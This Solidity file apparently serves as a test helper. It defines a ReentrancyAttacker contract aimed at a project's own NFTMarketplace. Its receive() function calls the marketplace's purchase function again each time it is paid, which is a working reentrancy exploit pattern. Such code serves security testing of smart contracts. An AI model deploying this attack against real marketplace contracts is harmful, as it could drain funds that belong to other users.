// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../NFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract ReentrancyAttacker is IERC721Receiver {
    NFTMarketplace private immutable marketplace;
    address private nftAddress;
    uint256 private tokenId;

    constructor(address _marketplaceAddress) {
        marketplace = NFTMarketplace(_marketplaceAddress);
    }
    
    function listNFT(address _nftAddress, uint256 _tokenId, uint256 _price) external {
        IERC721(_nftAddress).approve(address(marketplace), _tokenId);
        marketplace.list(_nftAddress, _tokenId, _price);
        nftAddress = _nftAddress;
        tokenId = _tokenId;
    }
    
    function attack(uint256 _price) internal {
        marketplace.purchase{value: _price}(nftAddress, tokenId);
    }

    function startAttack(uint256 _price) external payable {
        attack(_price);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {
        attack(msg.value);
    }
} 